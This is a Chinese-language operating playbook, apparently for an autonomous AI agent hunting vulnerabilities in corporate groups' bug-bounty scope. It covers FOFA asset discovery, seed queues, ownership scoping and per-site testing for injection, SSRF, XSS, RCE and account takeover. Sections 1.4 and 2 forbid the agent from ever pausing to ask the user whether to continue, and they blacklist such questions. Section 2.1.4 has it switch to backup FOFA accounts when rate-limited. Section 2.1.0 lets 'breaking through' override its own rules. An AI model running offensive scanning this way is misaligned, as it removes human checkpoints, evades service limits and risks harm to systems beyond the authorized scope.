**存活 ≠ 在登录表单上耗。** 见 §4.1.1：先找业务 API / 跳转后的业务 host，没会话时主业挖未登录。发会话 / 重置 / 改绑 / 换票有入口走 §4.2.2，无入口 N/A，不在表单上磨。同皮见 §3.3。

**本种子闭环内仍允许：**

- 这一种子 FOFA 翻页，把本种子结果捞完  
- 优质搜域 R 落盘 pending（§1.1.1），但本种子剩余活面没挖完 **不去搜 R**  
- 配额尽：停搜，挖本种子已入库剩余  

### 1.1 种子尽能力多备（硬 · 用户 2026-08-06）

**禁止：** 只 FOFA 用户原词一条；把种子条数定成「最多 N 条」；写完一批就当队列建完；企查查挂了就永远不补队列；**多种子一次搜完再挖**。  
**必须：** 分层后严格走 **一种子闭环（§1.0.1）**：搜 S → 清洗（去重、去废、去非存活、股权闸）→ 剩余活面全部挖完 → 才搜下一个。单站仍是 §4.3 即可换本种子内下一个 host；「挖完」≠ 宇宙级勾完每一 path。

| 维度 | 要求 |
|------|------|
| **业务名 / 产品 / 子品牌** | 尽全力多列（支付/金融/云/链/出行/数字科技/国际/内部线…）；SRC、官网、新闻、工商对外名能扫到的都入队 |
| **全资 1～4 级** | 子→孙→曾孙→玄孙 **尽量挖到 4 级**；主体名、曾用名、对外品牌/根域都当种子；**参股不入**（§3.2.0） |
| **全资根域 / 备案主域** | 大厂往往远超 15 个；能列就列；P2 长尾先活筛再 FOFA |
| **SRC 官网范围** | 业务线、域名、产品列表 **扫全入队（P0）** |

**数量：无上限。** 业务名、全资 1～4 级、根域/备案、SRC 范围、回灌 R，能列多少列多少。有些 SRC 本身就多，几十～上百条正常且必须，**禁止**砍成固定条数。  
「至少先落一批再开挖」只防偷懒只写用户原词一条；**任何条数都不是目标，更不是上限。** 工具挂了 → 先写已知多列开挖；通了再 **增量补队**。

| 来源 | 说明 |
|------|------|
| 用户原词 | 入口，不唯一 |
| 业务名 / 子品牌 | 尽量多，不封顶 |
| SRC 官网 | 全扫入队 P0 |
| 全资股权 1～4 级 | 100% 链路；参股不入 |
| 备案/根域 | 能多列就多列；P2 先活筛 |
| **优质面回灌根域** | FOFA/进站确认的有效优质资产 → 抽 **注册根域（二级域）** 作新种子再搜（§1.1.1） |

**分层（谁先 FOFA）：**

| 优先级 | 种子类型 | 策略 |
|--------|----------|------|
| **P0** | 用户点名业务、SRC 公布域/业务线、在用知名产品根域 | 可直接 FOFA；仍要去废 |
| **P1** | 企查查/证书常见、标题/org 常撞品牌的域 | 秒级活域过了再 FOFA |
| **P2** | 大批 ICP 主域、历史壳域 | **必须先 §1.2 活筛**；不过 → 不送 FOFA |
| **废/cold** | 死备案、纯停放、无解析 | 本轮不再碰 |

P0/P1 按一种子闭环做完再扫 P2；**禁止**一上来把几百条未活筛备案挨个 FOFA。队列里可以先列很多 P2（数量无上限），但送 FOFA 必须先活筛、且一次只搜一个。

### 1.1.1 优质资产根域回灌种子（硬 · 用户 2026-08-07）

> 自由跳：FOFA/进站碰到**有效优质面** → **立刻**把对应 **可 `domain=` 的搜域关键词** 写入种子队列。  
> **本种子剩余活面全部挖完之后** 该跳时，才 **优先** 用该词再 FOFA 整棵域；有相对 covered 的新 host 就挖，没有再跳别的种子。  
> 目的：不把搜索钉死在用户原词一条；优质业务簇的根域要能滚进关键词池再扩。  
> **不改道：** 回灌 ≠ 立刻去搜 R；本种子闭环没走完禁止为了 R 开新搜。

**语义（理解即可，规则里不钉死举例域名）**

| 概念 | 含义 |
|------|------|
| **业务 host** | 具体站（多级子域 / 带 path 的入口），进 covered、做矩阵 |
| **搜域 R** | 从优质 host **向上归约**出的、适合 `domain="R"` 的那一层（业务簇根 / 独立品牌根，而非每一个叶子 host） |
| **何时落盘** | **一旦确认优质可挖面就落盘**（pending），**不必等**该站宇宙级挖完 |

**归约原则**

- 叶子子域 → 归到其所属的 **业务簇根** 再搜（同一簇下多个三级 host 只对应 **一个** R）  
- 已是业务簇根 / 独立品牌根 → R 就是它自己  
- 大集团下不要只回灌一个已在队的集团大根就完事；**新出现的产品/业务簇根** 都要能单独进队再 `domain=`  
- **禁止**把每一个完整 host 字符串都当新种子刷 FOFA  

**何时回灌（同时满足）**

1. 来源：本任务 FOFA **或** 进站/JS/响应 host（已过 §3.2.0）  
2. **优质**：业务面大 / JS·接口多 / 登录后台 / 业务 API / Swagger·管理台等，可继续矩阵  
3. 归约出 R，且 R **尚未**在种子队列  
4. 归属过闸；参股 / CDN / 第三方 / 废壳 **不回灌**

**不回灌**

| 不写队 | 说明 |
|--------|------|
| 废壳 / Hello / 纯 SEO 同皮 | 无业务矩阵价值 |
| CDN / 图床 / 第三方库 | 噪声 |
| 队列里已有该 R | 防死循环 |
| 同簇多 host 但 R 已 pending/done | R 只加一次 |
| 参股 / 外包 / 非范围 | 股权闸 |

**落盘与再搜节奏**

1. **确认优质 → 立刻** `种子队列.md` 加一行：种子=`R`，P0/P1，**pending**，备注「回灌 · 源 host=…」  
2. **当前 host 继续挖**（§4.3）；本种子剩余活面继续挖；可与落盘并行  
3. **仅当本种子剩余活面已全部挖完、该换种时**：优先取回灌 pending → `domain="R"` 只搜这一个 R（结果可翻页）→ 去重去废去非存活 + 股权闸 → **剩下的挖完** 再搜下一个  
4. **有**相对 covered 的新 host/新面 → **优先挖完**；**没有** → 立刻跳下一 pending（不问继续）  
5. 无配额：先落盘，挖本种子已入库剩余；有额度且本种子已挖完再搜 R  

**禁止：** 叶子 host 条条刷 FOFA；优质只记 host 不回灌 R；回灌后不经去废去非存活全挖；R 已搜完还空刷；**本种子还剩活面就去 FOFA 那个 R**。

**一句话：** 优质 host 负责挖；向上归约出的**搜域 R** 立刻进种子池；**本种子挖完才**优先 FOFA 整棵 R 捞新资产，无新增再跳。

### 1.2 备案长尾 · 活域筛选（硬）

**备案 ≠ 可挖。** 长尾先便宜筛，活了再 FOFA，死了直接跳。

| 死/冷（跳过） | 活/值得 FOFA |
|---------------|--------------|
| 根域无 DNS **且** crt/被动也无有用 host | 根或 **子域** 有解析（业务常只挂 api/admin） |
| 根+www+已知子域探针全是停放/默认页 | 任一 host 有真实业务（登录/API/管理台） |
| FOFA `domain=` 条数探针 size=0 或全 park（有配额时） | 已见多 host/端口/标题差 |
| 与品牌零标题/证书/跳转关联 | 证书 SAN 挂业务名；或已确认活站带出的根域 |

**禁止只凭一条判死：** 仅根/www 连不上 → 必须再查 crt/被动子域；仅 401/403/登录墙 = **算活**；无 FOFA 配额时活筛只靠 DNS+HTTP+crt，**禁止为空筛再刷 FOFA**。

```
备案长尾 d
  1) 根 DNS？无 → 不立刻判死，先做 3)
  2) 根/www 短超时探 80/443 → 有业务味升活；停放/连不上 → 进 3)
  3) crt/被动子域 → 有用子域升活；0 且根/www 死 → cold
  4) 有配额可选 domain 条数探针；无配额跳过
  5) 通过 → 正式 FOFA → 去废 → 挖
```

**FOFA 已搜仍快弃：** 空/极少且全 CDN 默认页；标题同质停放；只有邮件/无关端口；与品牌完全不沾 → **本种子立刻换下一个**，禁止硬抠。

| 阶段 | 挡什么 |
|------|--------|
| §1.2 活筛 | 域名字段级死备案 |
| §3.1 去废 | 活域捞出的 host 噪声 |
| §3.2 蜂鸟 | 仅存疑归属 |
| §3.2.0 股权闸 | 参股/非 100% 主体 |

### 1.3 任务夹：续挖 / 新开 / 全做过了（硬 · 用户 2026-08-06）

**一句话：** 有旧夹先跳过已挖已搜；清了就乱序多种子新开；全都做过了就随机再搜或回扫看新增。

**A. 旧夹还在（续挖）** — 再喊同一模糊目标时：

| 做 | 不做 |
|----|------|
| **进既有** `Desktop\{目标}_SRC挖洞\` | 另建「{目标}2_SRC挖洞」或当全新任务 |
| 起手读：`资产/covered_hosts.txt`、`资产/种子队列.md`、`报告/`、dig STATE | 不看 covered 对已 done 站再全矩阵 |
| 优先 pending、未 covered host、新 FOFA 未 covered 面 | done/cold 种子再当 P0 空跑 |
| 同 host **新 path/新端口/新应用** 仍测（§3.1.1） | 「跳过已挖」理解成同 host 新接口也不碰 |

**B. 用户清理了任务夹（新开）**

无 covered/旧队列可依 → 新建目录与队列；种子仍按 §1.1；**顺序可洗牌**；禁止永远死磕用户原词固定顺序。

**C. 基本都做过了仍未叫停**

种子几乎全 done/cold、host 几乎都 covered → **禁止问继续、禁止空等**。优先 1，回扫是抽查不是流水线。

1. **随机再挖（默认先走）**：补业务名/产品/域名关键词，乱序 FOFA，只进未 covered 新 host  
2. **回扫旧种子（抽查）**：对曾 done 的再 FOFA / crt / 首页**一眼**，**只关心相对 covered 的新增**（新 host、同 host 新 path/新端口/新应用、构建号换了且带出新 API）

**回扫合格闸（硬 · 防回扫工厂）：**

| 先有证据才进站 | 立刻换、禁止全矩阵 |
|----------------|-------------------|
| 相对 covered 的新 host | umi/构建号没换，且无新 path |
| 同 host **新** path / 新端口 / 另一套应用 | 只确认「和 Txx 同一份壳」 |
| JS 哈希变了 **且** 抽出新 API | 只为把 `报告/` 里已有的洞再确认一遍（升链、新 path、新类型不算） |

- 回扫交付只写：新面列表，或一行 `0 新增`。`0 新增` **不算进度**。  
- **本回合连续 2 个**回扫都是 `0 新增` → 下一槽**必须**走随机新业务名，禁止再开「XX回扫」。隔任务 / 用户新开窗口后计数清零。  
- 禁止把财富/蚁盾/摩斯/链等已 done 种子轮流开线程刷 covered。

仍服从：百分百控股、§1.5 配额、§3.1.1 去重。经验篇里的「禁报假点」≠「根域永封」（见对应 `*src经验.md`）。

### 1.4 种子队列落盘 + 回合结束闸（硬）

**失败模式：** 做完一轮搜索就停 + 问「要不要继续」+ 没接着换品牌/域名；**或多种子一次搜完再挖**。  
用 **落盘队列 + 回合闸 + 一种子闭环（§1.0.1）** 卡住。

**路径（优先短路径）：** `Desktop\{任务}_SRC挖洞\资产\种子队列.md`（或 `{名}_dig/seed_queue.md`）

| 种子 | 类型 | 状态 | 备注 |
|------|------|------|------|
| 业务名 / SRC 域 / 全资子域… | P0/P1/P2 | pending / doing / done / cold | 何时 FOFA、池大小、为何 cold；续挖时 done=已搜过先跳过 |

**起手：**  
- 新开 → 写队列（业务名尽全力 + 全资 1～4 级 + SRC/备案；能列多少列多少，数量无上限；可洗牌）  
- 续挖 → **读**队列+covered+报告，从 pending 或 §1.3-C 开干；**禁止**空队列盖掉历史；可增量补 4 级与新业务名  

**禁止：** 队列只有用户原词；写固定条数就当齐了；只口头列不落盘；续挖装没看见旧队列。

```
pending → doing → 只搜这一个 S → 去重去废去非存活+股权闸 → 剩余活面全部挖完 → done / cold
本种子剩余活面没挖完 → 禁止取下一条 pending 去 FOFA
本种子变 done/cold 的同一轮工具循环内 → 立刻取下一条 pending → doing → 再走同一闭环
禁止：done 后结束本回合等用户说「继续」
禁止：多种子一次搜完再挖
全 done 且未叫停 → §1.3-C（随机/回扫），不是停工
```

**词义防呆：**

| 说法 | 正确 | 错误（禁止） |
|------|------|--------------|
| 本种子收工 / 本轮完成 | 只结束当前种子或当前站；种子收工 = 剩余活面已挖完，立刻换下一 pending 再走闭环 | 整场自由跳结束、可以问用户 |
| 一轮 FOFA 搜完 | 这一种子检索结果已捞齐，进入清洗+挖；**还不能搜下一个种子** | 整个集团挖完了；或搜完就换下一种子 |
| 全部搜索 | 队列全 done → 仍走 §1.3-C，仍不问继续 | 搜完就停 |
| 分批 FOFA | 这一种子的结果翻页 | 多种子连搜 / 一次搜完 |

**发最终回复前自检（命中任一条禁止收尾停工）：**

1. 还有 pending？→ 禁止结束；标下一条 doing 继续  
2. 刚 done 一种子？→ 禁止问继续；同一节奏开下一条  
3. 全 done 且 covered 盖满？→ 走 §1.3-C + §1.5；只有用户叫停才真停  
4. 最后一句是「要不要继续/换品牌吗/您指示下一步」？→ **违规**，删问句并换种子  

**黑名单收尾（自由跳 = bug）：** 「本轮搜完了要继续吗？」「其它品牌要不要也挖？」「先停在这里您指示」「需要我换种子吗？」  
**合法真停：** 用户叫停/清理/换目标/明确锁面；锁面簇做完；环境全线不可用且已试替代线后的极短报障。

**压缩/续跑后：** 优先读 `种子队列` + `covered` + `报告/`，从第一条 pending 或未完成的 doing 接着干；禁止压缩后只记得用户原词。

### 1.5 FOFA 配额与补池

- **有配额：** 只搜 **当前这一个** 种子（本种子结果可翻页）→ 去重去废去非存活 + 轻量归属（§3.2）→ **剩余活面挖完** → 才搜下一个。禁止有配额就把多种子连搜完。  
- **没配额（820041/429 等）：** **停 FOFA 空刷**（含活筛条数探针）；挖本种子已入库剩余；P2 活筛改 DNS+HTTP+crt；有额度且本种子已挖完再取下一未做种子  
- **空结果 / 接口挂 / 配额尽且池空：** 补池仍须去废 + 去非存活 + 轻量归属 + 股权闸  
  - crt.sh、subfinder、用户已有 `资产/`、进站 JS 抽出的 **范围内** 业务 host  
  - SRC/企查查新业务名入队；新备案入 P2 须活筛  
- 缺工具切线，**不要停工**；打成了按 `vuln-report-format` 落盘

### 1.6 扩面 · 起手 · 持续挖

| 做 | 说明 |
|----|------|
| 主扩面 | **一种子闭环（§1.0.1）**：搜一个 → 去重去废去非存活 → 剩余挖完 → 才搜下一个（+§1.5）；存疑才蜂鸟 |
| **优质根域回灌** | FOFA/进站确认的有效优质面 → 新 **注册根域** 入种子队列；**本种子挖完才**再搜（§1.1.1） |
| JS/配置/响应 host | 仅入口站已过 **§3.2.0** 时同产品业务 host 才入队；**参股站带出的不滚**；新根域同时走 §1.1.1 |
| 假域/业务键/第三方库域 | 不入队、不送 FOFA |
| 进站后 JS | 主责本站接口发现（§4.1：path + 钥匙）；真业务 host 按上行入队 |
| 起手优先 | 业务 JSON / 后台 / 管理台 / Swagger / Actuator / 调试口。**有登录只说明后面有业务面**（§4.1.1），不是去磨登录表单；登录表单弱口令不当起手。磨表单不当起手 ≠ 认证接口不打（§4.2.2） |
| 种子级轮换 | 本种子清洗后剩余活面全部 §4.3 / 记废 → 才换下一种子再搜；P2 必须先活筛 |
| 持续挖 | 本站完成 → 换本种子下一活站；本种子剩余挖完 → 下一种子再搜；报告写完**不收工**；工具挂了自己切线 |
| 禁止 | 只搜用户原词；**多种子一次搜完再挖**；本种子还剩活面就开下一种子 FOFA；卡在「企查查必须齐」不开挖；问要不要继续；一轮 FOFA 完就当任务结束；优质新根域只记 host 不回灌再搜；**有未挖活面仍空刷新词 FOFA**（§2.1） |
| 深挖优先 | 见 **§2.1**；扩面服务进站，条数不当进度；**不削减**种子广度与矩阵深度 |

SRC/企查查挂了 → **不阻塞开挖**；有啥种子用啥，回来再补队。  
进度可短记「种子 X 剩余活面挖完 / 站 Y 报告已落」，**不得以提问结尾停住**。

---

## 2. 空转判定（命中即纠偏 · 自触发）

**用户硬规则（2026-08-07）：空转就跳。**  
命中空转 → **立刻**换本种子下一条活 URL（或记废该条），禁止在 403 壳、无账密 health、已 covered 登录表单壳、已报同洞上继续堆探测。登录表单点过 ≠ §4.2.2 勾完；认证口勾过了不要再打一遍。  
**还在抠跳转 / JS 找业务面 = 不算空转。** 按 §4.2.2 打发会话 / 重置 / 改绑 / 换票 = 不算空转。磨验证码 / 默认口 / 同皮登录再试 = 空转。  
**肥面**（JS 多 / 后台 / 业务 JSON）还在抽 chunk、还原签名、写 §4.0 那几行、建对象图 → 算在干活，**不算**空转。**瘦壳**（403、无业务 script、同闸）才按 15～20 分钟无苗头跳。  
**本种子剩余活面没挖完 → 禁止**借空转去开新种子 FOFA。

| 信号 | 含义 |
|------|------|
| 长时间 `报告/` 不增 + 只堆 403/health/重复 path | **空转 → 换本种子下一条活 host**（不是开新种子搜） |
| 子线程/本线程 >15～20 分钟无可写正式报告的苗头只见噪声 | **瘦壳**杀这条线，换本种子下一条活 URL；**肥面**还在抽 JS / 建对象图不算此条。剩余没挖完禁止换种子搜新词 |
| 一种子/一轮 FOFA 完就停 + 问继续 | 违规收工（§1.4）；FOFA 完应进入清洗+挖，不是停，也不是立刻搜下一个种子 |
| 多种子一次搜完 / 本种子还剩活面就开下一种子 FOFA | 违反一种子闭环（§1.0.1） |
| 旧夹还在却从零开、不跳过 covered | 违反 §1.3-A |
| 全 done 后空等 / 不随机不回扫 | 违反 §1.3-C |
| 本回合连续回扫已 done 种子、umi 未变仍全矩阵 / 只刷 covered | **回扫工厂**（§1.3-C 闸）；下一槽改随机新业务名 |
| 队列未落盘或只有用户原词 | 必漏品牌/域名 |
| 回复以「要不要继续/换品牌」收尾 | 黑名单句式 |
| 只搜用户原词、能建的种子也不建 | 漏面（§1.1） |
| 多种子糊一锅、换种子对 covered 再全矩阵 | 违反 §3.1.1 |
| 条条蜂鸟 / 条条备案无脑 FOFA | 违反 §3.2 / §1.2 |
| 参股公司当集团资产深挖 | 违反 §3.2.0 |
| FOFA 820041/429 仍刷 | 配额尽空撞（§2.1 闸 D） |
| 本种子还剩未挖活面仍开新种子 FOFA | 扩面假进度（§1.0.1 / §2.1 闸 A） |
| 站未 §4.3 完就主攻新关键词测绘 | 违反深挖优先（§2.1 闸 B） |
| 优质词出现就抛下当前矩阵只去 FOFA | 违反只回灌不改道（§2.1 闸 C） |
| 多线程全员 FOFA/探活、无人建清单 | 双 FOFA 工厂（§2.1 闸 E） |
| 有前端无接口清单盲扫；类型只测两三种 | 假进度 / 偏科 |
| 卡死等 JS 抽干 | 误用 §4.1 |
| 同皮登录墙反复验证码/默认口；用户标了重要面却先清第一节壳 | 锁面顺序/同皮读歪（§0.1 / §3.3 / §4.1.1） |
| 看见登录页就换下一家，业务 API 还没挖 | 违反 §4.1.1 |
| 清单有发会话 / 重置 / 改绑 / 换票，却零 payload 就换站 | **漏测**（§4.2.2）→ 先补探针，不是空转跳站 |
| 业务口已抽出，全是同一登录码，还对同产品下一 host 再开全矩阵 | **同闸连磨**（§4.1.2）→ 本 host 收口，sibling 一眼差分，换真正未挖业务面 |
| 长时间 reports 不增，只见扩面探活 | 硬指标空转 |
| 同皮镜像逐个全矩阵；把 `报告/` 里已有的洞再确认一遍当新洞 | 重复空跑 |

**不算进度：** FOFA 条数、黑名单、探活计数、假中间件/纯文件通道、已落盘那份再确认一遍、CORS（不挖）；**纯登录码 /「请重新登录」/ NotLogin /「产品升级改造中」上把四件套勾完**；每个 path 喷过 `'` 但没有差分面。  
**算进度：** §4.0 几行说清这摊、接口清单（或合法降级）、回包线索进了本站队列、业务 JSON 上的全类型矩阵、有差分面的四件套、§4.2.2 有入口已勾或无入口 N/A、有会话时 §4.2.3 对象图/换 id、正式报告落盘、**未登录例外打穿或证伪**。  
**锁面时：** 空转纠偏只在范围内换路径，禁止借空转出圈。

### 2.1 深挖优先闸（纠偏「只扩面不进站」· 用户 2026-08-07）

> **定位（与 `skill-as-boost` 同精神）：** 本节约的是 **节奏/空转**，不是能力上限。  
> **只纠：** FOFA 条数当进度、关键词囤池不挖、双线程都在搜、优质词一出现就抛下半截站去刷测绘。  
> **绝不砍：** 种子尽能力多备、全类型矩阵、注入/SSRF/XSS/RCE 深度、JS 跟 host、漏洞链、新攻击面、工具切线、用户当次指令加码。  
> 口令：**一种子搜 → 清洗 → 挖完剩余活面 → 才换种 FOFA**；本种子内先清单后矩阵，先矩阵后换站；优质只回灌不改道；限流只挖池。  
> 与 §2「空转就跳」关系：**死壳/403 噪声上跳（本种子内换下一条活 URL）** = 对；**本种子还剩未挖活面就去开新种子 FOFA** = 错（见 §1.0.1 / 闸 B）。

#### 2.1.0 能力边界（防误读成砍能力）

| 本节能约束（只管节奏） | **绝对不是这个意思** |
|----------------------|----------------------|
| 本种子还剩没挖完的活站时，先别搜下一个种子 | 少建种子、给种子定「最多 N 条」。种子条数没有上限，能列多少列多少 |
| 当前站矩阵没做完，禁止用「再 FOFA 一批 / 先把种子搜完」充进度 | 禁止跟 JS 新 host、禁止多 path、禁止打穿高价值苗头 |
| 双线程不都当 FOFA 工厂 | 禁止 2 线程同时深挖两个 host |
| 优质词先落盘回灌 | 禁止再搜回灌 R、禁止补 4 级/新业务名 |
| 限流停空撞 | 备用账号也不能用；池空也不许补池 |
| 同闸停：同一登录码家族收口，sibling 不另开全矩阵（§4.1.2） | 看见登录页就换；业务 API 不用抽；未登录例外（公开列表出他主体、缺参仍出名单）也不打；新 path / 回码变了出数也不跟 |
| 本种子肥瘦分层：瘦壳一眼、肥面深挖（§4.3） | 肥面也 15 分钟没报告就杀；瘦壳当肥面开线程喷四件套 |

规则与现场冲突、或会漏洞时：**以打穿与证据为准**，本节约律让路给产出，事后可记一笔为何破闸。

#### 2.1.1 闸 A — 本种子还剩未挖活面 → 停开新种子 FOFA

**命中任一条 → 本轮禁止再 FOFA 新种子/新关键词，只挖本种子已清洗剩余：**

1. 当前种子清洗后还存在 **未 §4.3 / 未记废** 的活 host  
2. 或近 15 分钟主要在扩面/探活，而 **接口清单未建且 `报告/` 无增**

**仍允许 FOFA / 扩面：** 本种子结果翻页（还在捞这一种子）；本种子剩余活面已全部挖完/记废要换种；用户点名换线；站全死/人机死挡已记废；§1.3-C 全 done 后的随机/回扫。

#### 2.1.2 闸 B — 未「本轮完成」禁止拿新词 FOFA 充数

当前 doing host **未达 §4.3**，或本种子还剩未挖活面时：

- **禁止**「先再 FOFA / 先搜一波关键词 / 先把种子搜完再回来」当主动作  
- **必须**先：§4.0 说清这摊 → 全量 JS（path + 钥匙，或合法降级）→ 清单（回包线索随时补）→ 矩阵（有差分面的 §4.2.1 + §4.2.2；有会话加 §4.2.3，无入口 N/A）→ 打成了按 format 落盘或证伪；中危同一对象先升链；然后换本种子下一条活 URL（瘦面一眼即可）  
- 高价值苗头（稳注入/RCE/跨租户/未授权敏感读/可用凭证（认钥+不影响线上的能力例，不是抄到字符串）/任意登录进号/接管改密）**先打穿再换站**（与 §4.3 一致）

未达标却去开新种子 = **扩面假进度**，命中 §2 纠偏。

#### 2.1.3 闸 C — 优质关键词 / 搜域 R：只回灌，不改道狂欢

对齐 §1.1.1，再钉死节奏：

1. 优质词或归约搜域 R → **立刻**写入 `种子队列.md` pending（备注源 host）  
2. **当前 host 矩阵继续**，本种子剩余活面继续挖，不因新词中断半截深挖、不去搜 R  
3. **仅当**本种子剩余活面已全部挖完 / 必须换线 / 闸 A 允许搜时，才优先 `domain=R` 或该词再 FOFA，并再走 §1.0.1 闭环  
4. **禁止：** 叶子 host 条条刷 FOFA；好词只在对话里提不落盘；落盘后永远不搜也不标 cold；本种子还剩活面就去搜 R

#### 2.1.4 闸 D — FOFA 429 / 限流 / 820041 → 强制挖池

- 主号限流 → 可切 **备用 key**（见 fofa 三账号：主号 → backup → backup2）补 **当前缺口**（本种子/本 R 缺页），不是换语法连打  
- 三个号皆限或已够挖 → **整轮禁止再 FOFA**，只打已入库 + JS/crt 补 host  
- **禁止** 限流时空等、空撞、把「换账号刷条数」当进度  

#### 2.1.5 闸 E — 多线程：深挖为主，禁止双 FOFA 工厂

用户要 N 线程（如 2 线程）时默认：

| 线程角色 | 只干什么 | 禁止 |
|----------|----------|------|
| 深挖线程（默认全部/绝大多数） | 指定 host：§4.0→JS（path+钥匙）→清单→矩阵（有差分面四件套 + §4.2.2；有会话 §4.2.3）→报告；高危按 hunt-iter 写 DONE 拟进/拟补/不进 | 单独开新 FOFA 关键词当主业；**直接改打穿短表**；瘦壳开全矩阵 |
| 可选 1 条补面 | 队列下一优质 host 深挖，或同簇 JS 带出 host | 与深挖线程同时狂刷 FOFA |

FOFA 由主控 **短触发**（本种子结果翻页 / 本种子已挖完才换种 / 回灌 R 优先捞新）：结果入队后线程 **立刻回深挖本种子剩余**。  
**禁止** N 条线程都在 FOFA/探活而 0 条在建清单。  
**禁止** 补面线程去搜下一个种子。  
短表只主控（或单窗）写；子线程拟进行见 `hunt-iter`。spawn 交付必须含迭代。

#### 2.1.6 落盘与 covered（让装忙无处藏）

doing 站建议（有则更好自检，**不替代**真挖）：

```
{任务}_dig/{host}/endpoints.md   # 接口清单
{任务}_dig/{host}/matrix.md      # 类型矩阵；四件套有勾或 N/A+原因
js/{host}/                       # 全量提取 JS（有前端时）
```

- **写 `covered_hosts`** = 已过 §4.3，不是「curl 过首页 / FOFA 见过」  
- 进度三硬件（15～20 分钟内心跳）：① JS+清单有推进（肥面含对象图 / 签名还原）② 有差分面的四件套有真 payload 或 N/A；有会话则 §4.2.3 有换 id ③ 报告新增或本站矩阵收口  
- 三件皆无却只见 FOFA/探活计数 → **强制闸 A**，回未完成站

---

## 3. 去废 · 归属 · 股权闸

**FOFA/补池捞完必须清洗，禁止原样全挖。**

### 3.1 去重 / 去废 — 不去业务路径

| 该去 | 不该去 |
|------|--------|
| 同一 host:port 重复条 | 同 host 下不同 path/接口 |
| 假 TLD、业务键当域名 | `/api/a` 与 `/api/b` |
| CDN/静态/第三方库域 | 同 host 不同端口若业务不同 |
| 内网 IP、无关站 | 同品牌不同业务 host |
| 空白/乱码/纯静态无接口壳、长期死页 | **401/403/登录墙/管理台挑战页常有面，不因 4xx 整站丢** |

**禁止：** 「同 host 去重」= 只挖首页、丢掉接口路径。

### 3.1.1 整场任务全局去重（硬）

同一 `*_SRC挖洞` 内，多种子必然撞重复 — **禁止**当新资产再全矩阵。

| 层级 | 处理 |
|------|------|
| 同一 URL（归一化 host+port+path）已在资产/queue/covered | 跳过 |
| 同一 host:port 已 §4.3 完成 | 再被捞到 → 跳过深挖 |
| 同一 host **新 path/新接口** | **不跳过** |
| 同一 host **新端口** 或另一套应用 | 当新面 |
| 真同皮镜像（§3.3）族内已做过代表 | 其余跳过全矩阵 |
| 已落本任务 `报告/` 的洞 | 不当新洞再交（一模一样、写不写只认 format）。同类型不同 url、同 url 不同类型照测 |

状态建议落 dig：`资产/`、covered/done host、cold/black、本站接口清单。  
换种子后 **先对已有资产表去重再挖**；重复条数不当进度。

### 3.2 归属（轻量默认 · 蜂鸟仅存疑）

深扫前：去废 → **§3.2.0** → 轻量归属 → 入池。**蜂鸟不是默认步骤。**

#### 3.2.0 股权范围闸（硬 · 防参股误挖）

> 教训：参股公司自有域 = 非 100% 控股，非 100% 控股；洞再多也不算本集团 SRC。

| 默认可入池 | 默认不入池 |
|------------|------------|
| 集团自身、**100% 控股** 子/孙/曾孙/玄孙（尽量 4 级；超过 4 级仍 100% 可继续跟） | **参股**、战略/财务投资、合资非 100%、联营 |
| SRC 范围页明确列入的品牌/域名 | 仅因「获 XX 投资」就 FOFA 整域 |
| 已知全资品牌根域及业务子域 | 投资组合公司自有域名（参股类） |

**用户点名例外：** 参股/关联 **仅当用户当次明确说**「挖某某 / 这个参股也挖」才入池；没点名 → 面再肥也不进当前集团任务，冷池跳过。

| 信号 | 动作 |
|------|------|
| SRC/已知全资品牌/根域 | 可过 |
| 工商持股 &lt;100%、参股、战略投资 | 冷池（除非用户点名） |
| 备案主体是另一家独立公司、仅投资关系 | 冷池 |
| 股权说不清又非 SRC/已知全资域 | 浅探；坐实非 100% → 停深挖、不写本集团报告 |
| 已在错误主体出洞 | 标非本集团 / 不投该 SRC；任务内停扩该簇 |

**禁止：** 「获投资」当全资子；参股站 JS 再滚全族；范围错时面肥仍「先打穿」；企查查「关联企业」整表 FOFA。

#### 3.2.1 默认不过蜂鸟

够像目标**全资/SRC 范围**面（已知根域子域、证书/标题强相关全资品牌、本种子范围内 FOFA、从已确认范围内站带出的 host）→ **跳过蜂鸟** 进站/浅探。  
参股/非 100% → 冷池，不进本段。去废已砍的假域/CDN/第三方 → 直接废，也不用蜂鸟。

#### 3.2.2 仅存疑才蜂鸟

标题/证书/域名打架；不像已知根域又无品牌旁证；像别家/外包/公用壳；深挖中途像参股他司 → 再蜂鸟或证书/WHOIS 交叉一次。  
**禁止**条条蜂鸟；蜂鸟挂了改证书/标题/浅探，不卡死；境外/无 ICP 不卡蜂鸟；有备案主体仍要过 §3.2.0。

```
存疑 host → 证书/标题/已知后缀（秒级）→ 仍糊 → 蜂鸟一次
  → 挂/无 ICP → WHOIS/org 或浅探 → 有业务/肥组件升深扫；死壳废池
```

**好资产：** 范围内 + 公网活 + 登录/业务 API/后台/组件面。  
**坏资产：** 假域、第三方、空壳、纯健康检查；未授权纯文件 up/down 不当洞。

### 3.3 同皮 / 号段

仅 **指纹实质同构**（title/骨架/构建哈希/API 前缀/登录链）时：族内 **2～3 代表**全矩阵；其余只做探针（首页 + JS 哈希 + 一两个业务口），无差分 → **跳过全矩阵**。  
**同 host ≠ 同皮**；同 host 多 path 一律展开。  
**同闸已证（§4.1.2）压过本条的「再找 2～3 家代表」：** 第一家清单+未登录例外点完、其余口同一登录码 → sibling 一眼差分即可，不必再凑两家全矩阵。回码变了或抽出新 path 再升级。

**登录壳同皮** → 登录表单不用再挖。代表站 §4.2.2 做过的，sibling 一眼差分（有没有新的重置 / 改绑 / 换票 path）；没有新口不另开 §4.2.2。仍看 `jump` / `service=` / `moduleId` 是不是另一个业务面；是就去挖那个面。

**不算差分（禁止再开全矩阵）：** 仅入口 200 vs 403；能不能打开同一套 SPA；同一套网关前缀 + 同一登录墙 + JS 哈希相同；弱口令/验证码再试一遍。  
**才算差分：** 新 path / 新端口 / 另一套应用 / 新业务 API；同皮登录但跳到另一个业务面。

本种子内肥瘦分开（§4.3）：同皮/同闸的瘦面一眼证伪即可，不要每个 leftover host 开线程喷一轮四件套。

---

## 4. 单站主路径

进站口令（细节往下翻，不在这里另写一套）：说清这摊 → 抽 path+钥匙 → 力气按 `src-value` §1.1 → 请登录不喷、空列表要测、没差分就停 → 没号未授权通了再换 id（不限字段名）、有号带着会话换 id（不限字段名）→ 中危先跟 → 肥深瘦一眼。

### 4.0 进站先说清这摊（硬 · 防空扫）

清单前用 3～5 行写清（不准写成作文）：

- 谁在用（C 端 / 商家 / 运营）
- 核心对象（订单、工单、券、文档…）
- 钱、权、状态落在哪几个字段
- 没登录能碰到哪一层

说不清就先抓包补，不许空着开扫。后面改参数围着这几样动。

